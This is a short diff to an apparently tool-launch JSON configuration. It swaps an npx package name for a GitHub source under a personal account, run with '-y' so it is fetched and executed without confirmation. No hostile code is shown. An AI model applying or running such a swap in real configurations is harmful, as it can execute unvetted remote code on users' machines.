@@ -9,7 +9,7 @@
     "command": "npx",
     "args": [
       "-y",
-      "base-http402-extractor-api"
+      "github:psicossz29-netizen/base-http402-extractor-api"
     ]
   },
   "payment": {
